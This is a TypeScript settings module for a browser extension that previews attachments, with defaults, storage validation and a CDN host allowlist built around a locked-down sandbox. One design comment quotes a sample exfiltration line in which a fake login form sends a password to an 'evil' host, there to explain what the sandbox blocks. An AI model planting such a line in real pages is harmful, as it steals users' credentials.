import type { AttachmentKind, JsonExpand } from './protocol.ts'

/**
 * User settings, stored in `chrome.storage.sync`.
 *
 * Defaults reproduce the behaviour the extension shipped with, so an install
 * that never opens the options page behaves exactly as before.
 *
 * Only the content script reads storage. The sandbox page has no `chrome.*`
 * APIs at all, so whatever it needs is passed to it in the render message.
 */

export interface Settings {
  /** Which attachment kinds get a Preview button. */
  previewHtml: boolean
  previewMarkdown: boolean
  previewJson: boolean

  /**
   * Standalone diagram files — `.mmd` and `.puml` — as opposed to fenced blocks
   * inside a Markdown file.
   *
   * Separate from `mermaidEnabled` / `plantUmlEnabled` below, and the difference
   * matters: these decide whether the file gets a Preview button at all, those
   * decide whether a diagram is *drawn*. With `previewPlantUml` on and
   * `plantUmlEnabled` off, a `.puml` file still opens — showing its source,
   * without sending anything to a server.
   */
  previewMermaid: boolean
  previewPlantUml: boolean

  /**
   * Start HTML previews with scripts already allowed.
   *
   * Off by default and that matters: a static render cannot capture keystrokes,
   * which is what makes a fake login form in an attachment useless. Turning this
   * on removes that protection for every HTML preview, not just trusted ones.
   */
  allowScriptsByDefault: boolean

  /**
   * Draw mermaid diagrams — both ```mermaid blocks in Markdown and whole `.mmd`
   * files. Local; nothing leaves the machine.
   */
  mermaidEnabled: boolean

  /**
   * Draw plantuml diagrams — both ```plantuml blocks in Markdown and whole
   * `.puml` files.
   *
   * PlantUML has no browser renderer, so this sends the diagram source to
   * `plantUmlServer`. That is a real disclosure, hence a separate switch.
   */
  plantUmlEnabled: boolean
  plantUmlServer: string

  /**
   * Download the stylesheets, fonts, images and scripts an HTML attachment links
   * to by URL, and build them into the document before it is rendered.
   *
   * Off by default, and the reason is the whole security posture: the sandbox CSP
   * is `default-src 'none'` with no host anywhere, so a previewed file can reach
   * nothing. That is what stops a fake login form from exfiltrating keystrokes via
   * `new Image().src = 'https://evil/?' + password`.
   *
   * This setting does not change the CSP — the document still reaches no host.
   * What it changes is that *the extension* fetches a fixed set of URLs the sender
   * wrote into the file, before rendering, with no cookies. So the disclosure is
   * bounded and static: an allowed host learns the file was opened, and nothing
   * the page computes at runtime can ever be sent anywhere.
   *
   * Which is exactly why `remoteAssetHosts` is an allowlist and not "any https".
   */
  remoteAssets: boolean
  remoteAssetHosts: string[]

  /** How much of a JSON tree is open when a preview first appears. */
  jsonExpand: JsonExpand

  /** Files larger than this are refused rather than previewed. */
  maxBytes: number
}

export const PUBLIC_PLANTUML_SERVER = 'https://www.plantuml.com/plantuml'

/**
 * The hosts offered out of the box for `remoteAssetHosts`.
 *
 * Being on this list grants nothing on its own: `remoteAssets` is off by default,
 * and turning it on is what asks Chrome for the host permissions. A host that has
 * never been granted is never fetched from.
 *
 * These six are the CDNs a hand-written dashboard or report actually reaches for.
 * The two Google Fonts hosts belong together — `fonts.googleapis.com` serves the
 * stylesheet, and every `url()` inside it points at `fonts.gstatic.com`, so
 * allowing only the first gets a page with the right rules and no font files.
 */
export const DEFAULT_ASSET_HOSTS = [
  'cdn.tailwindcss.com',
  'cdn.jsdelivr.net',
  'unpkg.com',
  'cdnjs.cloudflare.com',
  'fonts.googleapis.com',
  'fonts.gstatic.com',
]

export const DEFAULT_SETTINGS: Settings = {
  previewHtml: true,
  previewMarkdown: true,
  previewJson: true,
  previewMermaid: true,
  previewPlantUml: true,
  allowScriptsByDefault: false,
  mermaidEnabled: true,
  plantUmlEnabled: true,
  plantUmlServer: PUBLIC_PLANTUML_SERVER,
  remoteAssets: false,
  remoteAssetHosts: [...DEFAULT_ASSET_HOSTS],
  jsonExpand: 'auto',
  maxBytes: 5 * 1024 * 1024,
}

/** Upper bound on `maxBytes`; past this the browser struggles regardless. */
export const MAX_ALLOWED_BYTES = 25 * 1024 * 1024

const KIND_SETTING: Record<AttachmentKind, keyof Settings> = {
  html: 'previewHtml',
  markdown: 'previewMarkdown',
  json: 'previewJson',
  mermaid: 'previewMermaid',
  plantuml: 'previewPlantUml',
}

export function isKindEnabled(settings: Settings, kind: AttachmentKind): boolean {
  return settings[KIND_SETTING[kind]] === true
}

export async function loadSettings(): Promise<Settings> {
  try {
    const stored = await chrome.storage.sync.get(DEFAULT_SETTINGS as unknown as Record<string, unknown>)
    return normalise(stored)
  } catch {
    // Storage can be unavailable in a torn-down context; defaults keep working.
    return { ...DEFAULT_SETTINGS }
  }
}

export async function saveSettings(settings: Settings): Promise<void> {
  await chrome.storage.sync.set(normalise(settings) as unknown as Record<string, unknown>)
}

/**
 * Coerces whatever is in storage into a usable Settings object.
 *
 * Storage is not a trusted schema: it survives extension upgrades, sync from
 * other machines, and hand-editing. A bad value here would otherwise surface as
 * a broken preview far from its cause.
 */
export function normalise(stored: Partial<Settings> | Record<string, unknown>): Settings {
  const raw = stored as Partial<Settings>

  return {
    previewHtml: bool(raw.previewHtml, DEFAULT_SETTINGS.previewHtml),
    previewMarkdown: bool(raw.previewMarkdown, DEFAULT_SETTINGS.previewMarkdown),
    previewJson: bool(raw.previewJson, DEFAULT_SETTINGS.previewJson),
    previewMermaid: bool(raw.previewMermaid, DEFAULT_SETTINGS.previewMermaid),
    previewPlantUml: bool(raw.previewPlantUml, DEFAULT_SETTINGS.previewPlantUml),
    allowScriptsByDefault: bool(raw.allowScriptsByDefault, DEFAULT_SETTINGS.allowScriptsByDefault),
    mermaidEnabled: bool(raw.mermaidEnabled, DEFAULT_SETTINGS.mermaidEnabled),
    plantUmlEnabled: bool(raw.plantUmlEnabled, DEFAULT_SETTINGS.plantUmlEnabled),
    plantUmlServer: normaliseServer(raw.plantUmlServer),
    remoteAssets: bool(raw.remoteAssets, DEFAULT_SETTINGS.remoteAssets),
    remoteAssetHosts: normaliseHosts(raw.remoteAssetHosts),
    jsonExpand: isExpand(raw.jsonExpand) ? raw.jsonExpand : DEFAULT_SETTINGS.jsonExpand,
    maxBytes: clampBytes(raw.maxBytes),
  }
}

/**
 * Server URLs are normalised to an https origin with no trailing slash, so the
 * diagram path can be appended without producing `//svg`.
 */
export function normaliseServer(value: unknown): string {
  if (typeof value !== 'string' || !value.trim()) return DEFAULT_SETTINGS.plantUmlServer

  try {
    const url = new URL(value.trim())
    if (url.protocol !== 'https:') return DEFAULT_SETTINGS.plantUmlServer
    return `${url.origin}${url.pathname.replace(/\/+$/, '')}`
  } catch {
    return DEFAULT_SETTINGS.plantUmlServer
  }
}

/** The origin pattern to request host permission for, e.g. `https://uml.hblab.vn/*`. */
export function serverOriginPattern(server: string): string {
  try {
    return `${new URL(server).origin}/*`
  } catch {
    return `${new URL(DEFAULT_SETTINGS.plantUmlServer).origin}/*`
  }
}

/**
 * A single asset host, as `cdn.example.com` or `*.example.com`.
 *
 * Accepts a pasted URL too, because that is what a user has on the clipboard when
 * they hit a blocked resource — `https://cdn.example.com/lib@3/x.css` becomes
 * `cdn.example.com`. Anything that is not a plausible hostname returns null and is
 * dropped rather than stored: a bad entry here would silently fail to match, and
 * the symptom would be an unstyled preview with nothing to point at.
 */
export function normaliseHost(value: unknown): string | null {
  if (typeof value !== 'string') return null

  let host = value.trim().toLowerCase()
  if (!host) return null

  // A pasted URL, with or without a scheme.
  host = host.replace(/^[a-z][a-z0-9+.-]*:\/\//, '')
  host = host.split('/')[0]!.split('?')[0]!.split('#')[0]!
  // Match patterns have no port; carrying one through would never match.
  host = host.replace(/:\d+$/, '')

  // A bare `*` would be "any host", which is the thing the allowlist exists to
  // prevent, so the wildcard is only allowed as a leading label.
  if (!/^(\*\.)?[a-z0-9-]+(\.[a-z0-9-]+)+$/.test(host)) return null

  return host
}

export function normaliseHosts(value: unknown): string[] {
  if (!Array.isArray(value)) return [...DEFAULT_ASSET_HOSTS]

  const hosts: string[] = []
  for (const entry of value) {
    const host = normaliseHost(entry)
    if (host && !hosts.includes(host)) hosts.push(host)
  }
  return hosts
}

/** The match patterns to request host permission for, e.g. `https://unpkg.com/*`. */
export function assetHostPatterns(hosts: string[]): string[] {
  return hosts.map((host) => `https://${host}/*`)
}

/**
 * Whether an asset URL may be fetched.
 *
 * https only, and the host must be on the list. This is the authoritative check
 * and it runs in the content script, not the service worker: most CDNs answer
 * `Access-Control-Allow-Origin: *`, so a missing host permission would *not* stop
 * the worker's fetch on its own. The permission is the user's consent moment; this
 * function is the enforcement.
 */
export function isAssetUrlAllowed(rawUrl: string, hosts: string[]): boolean {
  let url: URL
  try {
    url = new URL(rawUrl)
  } catch {
    return false
  }

  if (url.protocol !== 'https:') return false

  const name = url.hostname.toLowerCase()
  return hosts.some((host) =>
    host.startsWith('*.')
      ? name === host.slice(2) || name.endsWith(host.slice(1))
      : name === host,
  )
}

function bool(value: unknown, fallback: boolean): boolean {
  return typeof value === 'boolean' ? value : fallback
}

function isExpand(value: unknown): value is JsonExpand {
  return value === 'auto' || value === 'all' || value === 'none'
}

function clampBytes(value: unknown): number {
  if (typeof value !== 'number' || !Number.isFinite(value) || value <= 0) {
    return DEFAULT_SETTINGS.maxBytes
  }
  return Math.min(Math.round(value), MAX_ALLOWED_BYTES)
}
